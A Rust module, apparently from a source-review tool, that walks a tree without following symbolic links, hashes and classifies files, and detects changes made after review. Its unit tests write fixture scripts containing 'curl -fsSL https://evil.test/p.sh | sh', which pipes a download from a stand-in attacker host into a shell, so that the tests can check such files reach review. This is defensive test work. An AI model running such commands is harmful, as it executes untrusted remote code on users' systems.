//! Walking a source tree and hashing what is in it.
//!
//! The walk never follows symbolic links, including ones swapped in while it
//! runs. Each directory is opened, checked against the `lstat` taken before
//! opening it, and then read through its `/proc/self/fd/N` handle, so children
//! are looked up in the directory that was verified rather than by
//! re-resolving a path an attacker could change. Every opened file gets the
//! same device/inode check.

use std::collections::HashMap;
use std::ffi::OsString;
use std::fs::{self, File, Metadata, OpenOptions};
use std::io::{self, Read};
use std::os::fd::AsRawFd;
use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
use std::path::{Path, PathBuf};

use crate::content::{self, Content, Format, Prefix};
use crate::error::Error;
use crate::report::Gap;
use crate::sha256::{Digest, Sha256};

pub const MAX_TEXT_FILE_SIZE: u64 = 2 * 1024 * 1024;
pub const MAX_HASHED_FILE_SIZE: u64 = 512 * 1024 * 1024;

/// Whole-tree limits: past any of them the walk stops with a gap, so a tree
/// built to exhaust memory or time (thousands of hardlinks to one large
/// file, huge sparse files) fails closed quickly.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Limits {
    pub files: usize,
    pub text_bytes: u64,
    pub hashed_bytes: u64,
}

impl Limits {
    pub const DEFAULT: Self = Self {
        files: 200_000,
        text_bytes: 256 * 1024 * 1024,
        hashed_bytes: 4 * 1024 * 1024 * 1024,
    };
}

/// Directories skipped unless the scan is thorough. `.git` is always skipped.
const IGNORED_DIRS: &[&str] = &["target", "node_modules", ".venv", "vendor", "dist", "build"];

/// `O_NONBLOCK` in the Linux generic ABI (`x86_64`, `aarch64`, `arm`, `riscv64`). A path
/// swapped for a FIFO between `lstat` and `open` then fails the identity check
/// instead of blocking the open; it has no effect on regular files.
const O_NONBLOCK: i32 = 0o4000;

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ScanConfig {
    pub root: PathBuf,
    pub include_ignored_dirs: bool,
    /// Top-level directory names left out of both the review and the snapshot.
    pub excluded_top_level: Vec<String>,
    pub limits: Limits,
}

impl ScanConfig {
    pub fn new(root: impl Into<PathBuf>) -> Self {
        Self {
            root: root.into(),
            include_ignored_dirs: false,
            excluded_top_level: Vec::new(),
            limits: Limits::DEFAULT,
        }
    }

    fn skips(&self, name: &str, top_level: bool) -> bool {
        name == ".git"
            || (!self.include_ignored_dirs && IGNORED_DIRS.contains(&name))
            || (top_level
                && self
                    .excluded_top_level
                    .iter()
                    .any(|excluded| excluded == name))
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum FileKind {
    /// Text within the review size limit (see `FileHash::lossy`).
    Text,
    /// A script, build or config file holding binary data: a gap.
    Undecodable,
    /// Hashed but not reviewed.
    Binary,
    /// Text too large to review; makes the scan incomplete.
    OversizedText,
    /// A relative symbolic link to a file or directory the review covers.
    /// Its digest is over the link text, so retargeting it changes the
    /// snapshot.
    Symlink,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct FileHash {
    /// Path relative to the scan root, `/`-separated.
    pub path: String,
    pub sha256: Digest,
    pub kind: FileKind,
    /// The format of a hash-only file.
    pub format: Option<Format>,
    /// Text decoded with replacement characters.
    pub lossy: bool,
    /// Size in bytes.
    pub bytes: u64,
}

/// The files of a tree, sorted by path.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Snapshot {
    files: Vec<FileHash>,
}

impl Snapshot {
    fn from_files(mut files: Vec<FileHash>) -> Self {
        files.sort_by(|left, right| left.path.cmp(&right.path));
        Self { files }
    }

    pub fn files(&self) -> &[FileHash] {
        &self.files
    }

    pub fn count(&self, kind: FileKind) -> usize {
        self.files.iter().filter(|file| file.kind == kind).count()
    }

    /// One digest over the whole manifest: path, NUL, hex digest and a kind
    /// byte per file (1 reviewed text, 2 symbolic link, 0 otherwise).
    pub fn manifest_digest(&self) -> Digest {
        let mut hasher = Sha256::new();
        for file in &self.files {
            hasher.update(file.path.as_bytes());
            hasher.update(&[0]);
            hasher.update(file.sha256.to_string().as_bytes());
            hasher.update(&[match file.kind {
                FileKind::Text => 1,
                FileKind::Symlink => 2,
                FileKind::Binary | FileKind::OversizedText | FileKind::Undecodable => 0,
            }]);
            hasher.update(b"\n");
        }
        hasher.finalize()
    }
}

/// A reviewable text file found by the walk.
pub struct TextFile<'a> {
    pub rel: &'a str,
    pub text: &'a str,
    /// Decoded with replacement characters from a legacy encoding.
    pub lossy: bool,
}

/// Walks the tree, calling `on_text` for each reviewable text file. Returns
/// the snapshot of every file found and the reasons the walk was incomplete.
pub fn walk(config: &ScanConfig, on_text: &mut dyn FnMut(TextFile<'_>)) -> (Snapshot, Vec<Gap>) {
    let mut walker = Walker {
        config,
        on_text,
        files: Vec::new(),
        gaps: Vec::new(),
        text_bytes: 0,
        hashed_bytes: 0,
        stopped: false,
        links: HashMap::new(),
    };

    let root = &config.root;
    let rel = if fs::symlink_metadata(root).is_ok_and(|metadata| metadata.is_dir()) {
        String::new()
    } else {
        root.file_name().map_or_else(
            || root.display().to_string(),
            |name| name.to_string_lossy().into_owned(),
        )
    };
    walker.entry(root, root, rel);

    (Snapshot::from_files(walker.files), walker.gaps)
}

/// Re-walks the tree and requires it to match `expected` exactly.
pub fn verify_unchanged(config: &ScanConfig, expected: &Snapshot) -> Result<(), Error> {
    let (current, gaps) = walk(config, &mut |_| {});
    if !gaps.is_empty() {
        return Err(Error::Refused(
            "the source tree changed or became unreadable after review".into(),
        ));
    }
    if current != *expected {
        return Err(Error::Refused(
            "the scanned file set or file contents changed after review".into(),
        ));
    }
    Ok(())
}

struct Walker<'a> {
    config: &'a ScanConfig,
    on_text: &'a mut dyn FnMut(TextFile<'_>),
    files: Vec<FileHash>,
    gaps: Vec<Gap>,
    text_bytes: u64,
    hashed_bytes: u64,
    /// A limit was passed: the walk stops and the review is incomplete.
    stopped: bool,
    /// Files with more than one link, by device and inode: read once.
    links: HashMap<(u64, u64), (Digest, Contents)>,
}

impl Walker<'_> {
    fn io_gap(&mut self, logical: &Path, source: io::Error) {
        self.gaps.push(Gap::Io(Error::Io {
            path: logical.to_path_buf(),
            source,
        }));
    }

    /// Visits one entry. `access` is the path used to reach it (under a
    /// verified directory handle); `logical` is the path shown to the user.
    fn entry(&mut self, access: &Path, logical: &Path, rel: String) {
        if self.stopped {
            return;
        }
        if self.files.len() >= self.config.limits.files {
            return self.stop();
        }
        let metadata = match fs::symlink_metadata(access) {
            Ok(metadata) => metadata,
            Err(error) => return self.io_gap(logical, error),
        };
        let file_type = metadata.file_type();
        let shown = logical.display().to_string();

        if file_type.is_symlink() {
            self.symlink(access, logical, rel);
        } else if file_type.is_dir() {
            match open_verified(access, &metadata) {
                Ok(directory) => self.directory(&directory, logical, &rel),
                Err(error) => self.io_gap(logical, error),
            }
        } else if file_type.is_file() {
            match open_verified(access, &metadata) {
                Ok(file) => self.file(file, &metadata, logical, rel),
                Err(error) => self.io_gap(logical, error),
            }
        } else {
            self.gaps.push(Gap::SpecialFile(shown));
        }
    }

    /// Records a link that stays inside the reviewed tree; anything else is
    /// a gap. Links are never followed: the file or directory they name is
    /// reviewed where it is.
    fn symlink(&mut self, access: &Path, logical: &Path, rel: String) {
        if logical == self.config.root {
            return self.gaps.push(Gap::Symlink(logical.display().to_string()));
        }
        let target = match fs::read_link(access) {
            Ok(target) => target,
            Err(error) => return self.io_gap(logical, error),
        };
        match target.to_str() {
            Some(target) if self.is_in_tree_target(&rel, target) => {
                let mut hasher = Sha256::new();
                hasher.update(b"symlink\0");
                hasher.update(target.as_bytes());
                self.files.push(FileHash {
                    path: rel,
                    sha256: hasher.finalize(),
                    kind: FileKind::Symlink,
                    format: None,
                    lossy: false,
                    bytes: 0,
                });
            }
            Some(_) | None => self.gaps.push(Gap::Symlink(logical.display().to_string())),
        }
    }

    /// Whether the link at `rel` names, relative to its own directory, an
    /// existing regular file or directory that the walk reviews. `..` may
    /// only lead the target and never climb above the root. The link's own
    /// ancestors are real directories (the walk never follows links), and
    /// every component after them must be too, so the lexical resolution
    /// is the real one.
    fn is_in_tree_target(&self, rel: &str, target: &str) -> bool {
        if target.is_empty() || target.starts_with('/') {
            return false;
        }
        let mut resolved: Vec<&str> = rel.split('/').collect();
        resolved.pop();
        let mut leading = true;
        for component in target.split('/') {
            match component {
                "" | "." => {}
                ".." if leading => {
                    if resolved.pop().is_none() {
                        return false;
                    }
                }
                ".." => return false,
                name => {
                    leading = false;
                    resolved.push(name);
                }
            }
        }
        if resolved.is_empty() {
            return false;
        }

        let mut path = self.config.root.clone();
        for (index, name) in resolved.iter().enumerate() {
            if self.config.skips(name, index == 0) {
                return false;
            }
            path.push(name);
            let Ok(metadata) = fs::symlink_metadata(&path) else {
                return false;
            };
            let last = index + 1 == resolved.len();
            if !(metadata.is_dir() || (last && metadata.is_file())) {
                return false;
            }
        }
        true
    }

    fn directory(&mut self, directory: &File, logical: &Path, rel: &str) {
        let handle = fd_path(directory);
        let listing = match fs::read_dir(&handle) {
            Ok(listing) => listing,
            Err(error) => return self.io_gap(logical, error),
        };

        let mut names: Vec<OsString> = Vec::new();
        for entry in listing {
            match entry {
                Ok(entry) => names.push(entry.file_name()),
                Err(error) => self.io_gap(logical, error),
            }
        }
        names.sort();

        for name in names {
            let child_logical = logical.join(&name);
            let Some(name_text) = name.to_str() else {
                self.gaps
                    .push(Gap::NonUtf8Name(child_logical.display().to_string()));
                continue;
            };
            if self.config.skips(name_text, rel.is_empty()) {
                continue;
            }

            let child_rel = if rel.is_empty() {
                name_text.to_string()
            } else {
                format!("{rel}/{name_text}")
            };
            self.entry(&handle.join(&name), &child_logical, child_rel);
        }
    }

    fn stop(&mut self) {
        if !self.stopped {
            self.stopped = true;
            self.gaps.push(Gap::TreeTooLarge {
                files: self.files.len(),
                bytes: self.hashed_bytes,
            });
        }
    }

    fn file(&mut self, mut file: File, metadata: &Metadata, logical: &Path, rel: String) {
        if metadata.len() > MAX_HASHED_FILE_SIZE {
            self.gaps
                .push(Gap::HashLimit(logical.display().to_string()));
            return;
        }
        // Counted before reading, so a huge sparse file is refused unread.
        self.hashed_bytes += metadata.len();
        if self.hashed_bytes > self.config.limits.hashed_bytes {
            return self.stop();
        }

        let executable = metadata.mode() & 0o111 != 0;
        let key = (metadata.dev(), metadata.ino());
        let cached = (metadata.nlink() > 1)
            .then(|| self.links.get(&key).cloned())
            .flatten();
        let (sha256, contents) = match cached {
            Some(result) => result,
            None => match read_classified(&mut file, &rel, executable) {
                Ok(result) => {
                    if metadata.nlink() > 1 {
                        self.links.insert(key, result.clone());
                    }
                    result
                }
                Err(error) => return self.io_gap(logical, error),
            },
        };
        let (kind, format, lossy) = match &contents {
            Contents::Text(text, lossy) => {
                self.text_bytes += text.len() as u64;
                if self.text_bytes > self.config.limits.text_bytes {
                    return self.stop();
                }
                (self.on_text)(TextFile {
                    rel: &rel,
                    text,
                    lossy: *lossy,
                });
                (FileKind::Text, None, *lossy)
            }
            Contents::Binary(format) => (FileKind::Binary, Some(*format), false),
            Contents::OversizedText => {
                self.gaps.push(Gap::OversizedText(rel.clone()));
                (FileKind::OversizedText, None, false)
            }
            Contents::Undecodable => {
                self.gaps.push(Gap::Undecodable(rel.clone()));
                (FileKind::Undecodable, None, false)
            }
        };
        self.files.push(FileHash {
            path: rel,
            sha256,
            kind,
            format,
            lossy,
            bytes: metadata.len(),
        });
    }
}

fn fd_path(file: &File) -> PathBuf {
    PathBuf::from(format!("/proc/self/fd/{}", file.as_raw_fd()))
}

/// Opens `access` and checks it is still the object `expected` describes.
fn open_verified(access: &Path, expected: &Metadata) -> io::Result<File> {
    let file = OpenOptions::new()
        .read(true)
        .custom_flags(O_NONBLOCK)
        .open(access)?;
    let opened = file.metadata()?;
    if opened.dev() != expected.dev() || opened.ino() != expected.ino() {
        return Err(io::Error::other("changed while it was being scanned"));
    }
    Ok(file)
}

#[derive(Clone)]
enum Contents {
    /// Text to review; `true` when decoded with replacement characters.
    Text(String, bool),
    Binary(Format),
    OversizedText,
    Undecodable,
}

/// Hashes the whole file and classifies it (see `content::classify`),
/// keeping its text when it is small enough to review. Larger files are
/// classified from their first bytes and streamed.
fn read_classified(file: &mut File, rel: &str, executable: bool) -> io::Result<(Digest, Contents)> {
    let mut hasher = Sha256::new();
    let mut head = Vec::new();
    file.by_ref()
        .take(MAX_TEXT_FILE_SIZE + 1)
        .read_to_end(&mut head)?;
    hasher.update(&head);

    if head.len() as u64 <= MAX_TEXT_FILE_SIZE {
        let digest = hasher.finalize();
        let contents = match content::classify(rel, executable, false, &head) {
            Content::Text(text) => Contents::Text(text, false),
            Content::Lossy { text, .. } => Contents::Text(text, true),
            Content::Binary(format) => Contents::Binary(format),
            Content::Undecodable => Contents::Undecodable,
        };
        return Ok((digest, contents));
    }

    let contents = match content::classify_prefix(rel, executable, &head) {
        Prefix::Text => Contents::OversizedText,
        Prefix::Binary(format) => Contents::Binary(format),
        Prefix::Undecodable => Contents::Undecodable,
    };

    let mut total = head.len() as u64;
    let mut buffer = vec![0_u8; 64 * 1024];
    loop {
        let count = file.read(&mut buffer)?;
        if count == 0 {
            break;
        }
        total += count as u64;
        if total > MAX_HASHED_FILE_SIZE {
            return Err(io::Error::other("file grew past the integrity-hash limit"));
        }
        hasher.update(&buffer[..count]);
    }
    Ok((hasher.finalize(), contents))
}

#[cfg(test)]
mod tests {
    use std::ffi::OsStr;
    use std::fs;
    use std::os::unix::ffi::OsStrExt;
    use std::os::unix::fs::symlink;

    use super::{FileKind, MAX_TEXT_FILE_SIZE, ScanConfig, verify_unchanged, walk};
    use crate::report::Gap;
    use crate::test_support::TempDir;

    fn walk_texts(config: &ScanConfig) -> (Vec<String>, super::Snapshot, Vec<Gap>) {
        let mut texts = Vec::new();
        let (snapshot, gaps) = walk(config, &mut |file| texts.push(file.rel.to_string()));
        (texts, snapshot, gaps)
    }

    #[test]
    fn hashes_files_and_detects_post_review_changes() {
        let dir = TempDir::new("snapshot");
        let source = dir.path().join("main.rs");
        fs::write(&source, "fn main() {}\n").unwrap();
        let config = ScanConfig::new(dir.path());

        let (texts, snapshot, gaps) = walk_texts(&config);
        assert_eq!(texts, ["main.rs"]);
        assert!(gaps.is_empty());
        assert_eq!(snapshot.files().len(), 1);
        assert!(verify_unchanged(&config, &snapshot).is_ok());

        fs::write(&source, "fn main() { println!(\"changed\"); }\n").unwrap();
        assert!(verify_unchanged(&config, &snapshot).is_err());
    }

    #[test]
    fn skips_git_and_generated_directories_unless_thorough() {
        let dir = TempDir::new("ignored");
        fs::create_dir_all(dir.path().join(".git")).unwrap();
        fs::create_dir_all(dir.path().join("vendor/theme")).unwrap();
        fs::write(dir.path().join(".git/config"), "x\n").unwrap();
        fs::write(dir.path().join("vendor/theme/payload.lua"), "x\n").unwrap();

        let mut config = ScanConfig::new(dir.path());
        assert!(walk_texts(&config).0.is_empty());

        config.include_ignored_dirs = true;
        assert_eq!(walk_texts(&config).0, ["vendor/theme/payload.lua"]);
    }

    #[test]
    fn excludes_only_top_level_directories() {
        let dir = TempDir::new("excluded");
        fs::create_dir_all(dir.path().join("src")).unwrap();
        fs::create_dir_all(dir.path().join("lib/src")).unwrap();
        fs::write(dir.path().join("src/a.c"), "x\n").unwrap();
        fs::write(dir.path().join("lib/src/b.c"), "x\n").unwrap();
        fs::write(dir.path().join("PKGBUILD"), "x\n").unwrap();

        let mut config = ScanConfig::new(dir.path());
        config.excluded_top_level = vec!["src".to_string()];
        assert_eq!(walk_texts(&config).0, ["PKGBUILD", "lib/src/b.c"]);
    }

    #[test]
    fn refuses_symlinks_and_non_utf8_names() {
        let dir = TempDir::new("links");
        fs::write(dir.path().join("real.rs"), "x\n").unwrap();
        symlink(dir.path().join("real.rs"), dir.path().join("link.rs")).unwrap();
        fs::write(dir.path().join(OsStr::from_bytes(b"bad-\xff.txt")), "x\n").unwrap();

        let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert!(gaps.iter().any(|gap| matches!(gap, Gap::Symlink(_))));
        assert!(gaps.iter().any(|gap| matches!(gap, Gap::NonUtf8Name(_))));
    }

    #[test]
    fn relative_links_inside_the_tree_are_recorded_not_followed() {
        let dir = TempDir::new("in-tree-links");
        fs::create_dir_all(dir.path().join("LICENSES")).unwrap();
        fs::create_dir_all(dir.path().join("docs")).unwrap();
        fs::write(dir.path().join("LICENSE"), "0BSD\n").unwrap();
        symlink("../LICENSE", dir.path().join("LICENSES/0BSD.txt")).unwrap();
        symlink("docs", dir.path().join("documentation")).unwrap();
        let config = ScanConfig::new(dir.path());

        let (texts, snapshot, gaps) = walk_texts(&config);
        assert!(gaps.is_empty(), "{gaps:?}");
        assert_eq!(texts, ["LICENSE"]);
        assert_eq!(snapshot.count(FileKind::Symlink), 2);

        // Retargeting a link changes the snapshot.
        fs::remove_file(dir.path().join("LICENSES/0BSD.txt")).unwrap();
        symlink("../LICENSES", dir.path().join("LICENSES/0BSD.txt")).unwrap();
        assert!(verify_unchanged(&config, &snapshot).is_err());
    }

    #[test]
    fn links_leaving_or_hiding_from_the_review_are_refused() {
        let outside = TempDir::new("link-outside");
        fs::write(outside.path().join("secret"), "x\n").unwrap();

        for (name, target) in [
            (
                "absolute",
                outside.path().join("secret").display().to_string(),
            ),
            ("escapes", "../secret".to_string()),
            ("climbs-back", "sub/../../secret".to_string()),
            ("dangling", "missing".to_string()),
            ("into-git", ".git/config".to_string()),
            ("into-ignored", "node_modules/x.js".to_string()),
            ("through-link", "alias/file".to_string()),
        ] {
            let dir = TempDir::new("link-refused");
            fs::create_dir_all(dir.path().join(".git")).unwrap();
            fs::create_dir_all(dir.path().join("node_modules")).unwrap();
            fs::create_dir_all(dir.path().join("sub")).unwrap();
            fs::write(dir.path().join(".git/config"), "x\n").unwrap();
            fs::write(dir.path().join("node_modules/x.js"), "x\n").unwrap();
            fs::write(dir.path().join("sub/file"), "x\n").unwrap();
            symlink(outside.path(), dir.path().join("alias")).unwrap();
            symlink(&target, dir.path().join(name)).unwrap();

            let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path()));
            assert!(
                gaps.iter()
                    .any(|gap| matches!(gap, Gap::Symlink(path) if path.ends_with(name))),
                "{name} -> {target}: {gaps:?}"
            );
        }
    }

    #[test]
    fn a_symlinked_root_is_refused() {
        let dir = TempDir::new("root-link");
        fs::create_dir(dir.path().join("real")).unwrap();
        symlink(dir.path().join("real"), dir.path().join("link")).unwrap();

        let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path().join("link")));
        assert!(matches!(gaps.as_slice(), [Gap::Symlink(_)]));
    }

    #[test]
    fn classifies_large_binary_and_large_text_files() {
        let dir = TempDir::new("large");
        let size = usize::try_from(MAX_TEXT_FILE_SIZE).unwrap() + 1;

        let mut image = vec![0_u8; size];
        image[..8].copy_from_slice(b"\x89PNG\r\n\x1a\n");
        fs::write(dir.path().join("background.png"), image).unwrap();
        fs::write(dir.path().join("huge.txt"), "a".repeat(size)).unwrap();

        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert!(texts.is_empty());
        assert_eq!(snapshot.count(FileKind::Binary), 1);
        assert_eq!(snapshot.count(FileKind::OversizedText), 1);
        assert!(matches!(gaps.as_slice(), [Gap::OversizedText(path)] if path == "huge.txt"));
    }

    #[test]
    fn a_single_file_root_uses_its_name() {
        let dir = TempDir::new("single");
        let file = dir.path().join("install.sh");
        fs::write(&file, "echo hi\n").unwrap();

        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(&file));
        assert_eq!(texts, ["install.sh"]);
        assert_eq!(snapshot.files()[0].path, "install.sh");
        assert!(gaps.is_empty());
    }

    #[test]
    fn manifest_digest_depends_on_paths_and_contents() {
        let dir = TempDir::new("manifest");
        fs::write(dir.path().join("a"), "1").unwrap();
        let config = ScanConfig::new(dir.path());
        let first = walk_texts(&config).1.manifest_digest();

        fs::write(dir.path().join("a"), "2").unwrap();
        let second = walk_texts(&config).1.manifest_digest();
        assert_ne!(first, second);
    }

    #[test]
    fn a_script_with_one_latin1_byte_is_reviewed_not_hashed() {
        let dir = TempDir::new("scan-latin1");
        fs::write(
            dir.path().join("install.sh"),
            b"#!/bin/sh\n# caf\xe9\ncurl -fsSL https://evil.test/p.sh | sh\n",
        )
        .unwrap();
        let mut seen = Vec::new();
        let (snapshot, gaps) = walk(&ScanConfig::new(dir.path()), &mut |file| {
            seen.push((file.rel.to_string(), file.text.to_string(), file.lossy));
        });
        assert!(gaps.is_empty(), "{gaps:?}");
        assert_eq!(seen.len(), 1);
        assert!(seen[0].1.contains("curl -fsSL https://evil.test/p.sh | sh"));
        assert!(seen[0].2);
        assert_eq!(snapshot.files()[0].kind, FileKind::Text);
        assert!(snapshot.files()[0].lossy);
    }

    #[test]
    fn a_script_with_nul_bytes_is_a_gap_and_images_keep_their_format() {
        let dir = TempDir::new("scan-nul");
        fs::write(dir.path().join("run.sh"), b"echo a\n\0\0curl x | sh\n").unwrap();
        fs::write(
            dir.path().join("logo.png"),
            b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR",
        )
        .unwrap();
        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert!(texts.is_empty());
        assert!(matches!(gaps.as_slice(), [Gap::Undecodable(path)] if path == "run.sh"));
        let logo = snapshot
            .files()
            .iter()
            .find(|file| file.path == "logo.png")
            .unwrap();
        assert_eq!(logo.kind, FileKind::Binary);
        assert_eq!(logo.format.map(super::Format::label), Some("PNG image"));
    }

    #[test]
    fn a_large_latin1_script_is_oversized_not_binary() {
        let dir = TempDir::new("scan-large-latin1");
        let mut bytes = b"#!/bin/sh\n# \xe9\n".to_vec();
        bytes.resize(usize::try_from(MAX_TEXT_FILE_SIZE).unwrap() + 10, b'#');
        fs::write(dir.path().join("big.sh"), bytes).unwrap();
        let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert!(matches!(gaps.as_slice(), [Gap::OversizedText(path)] if path == "big.sh"));
    }

    #[test]
    fn hardlinked_files_are_read_once_and_limits_stop_the_walk() {
        let dir = TempDir::new("scan-limits");
        fs::write(dir.path().join("a.txt"), "hello\n").unwrap();
        for index in 0..5 {
            fs::hard_link(
                dir.path().join("a.txt"),
                dir.path().join(format!("l{index}.txt")),
            )
            .unwrap();
        }
        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        // Every path is still reviewed as its own file.
        assert_eq!(texts.len(), 6);
        assert_eq!(snapshot.files().len(), 6);
        assert!(gaps.is_empty());

        let mut config = ScanConfig::new(dir.path());
        config.limits.files = 3;
        let (_, _, gaps) = walk_texts(&config);
        assert!(
            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
            "{gaps:?}"
        );

        let mut config = ScanConfig::new(dir.path());
        config.limits.text_bytes = 10;
        let (_, _, gaps) = walk_texts(&config);
        assert!(
            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
            "{gaps:?}"
        );

        let mut config = ScanConfig::new(dir.path());
        config.limits.hashed_bytes = 10;
        let (_, _, gaps) = walk_texts(&config);
        assert!(
            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
            "{gaps:?}"
        );
    }
}
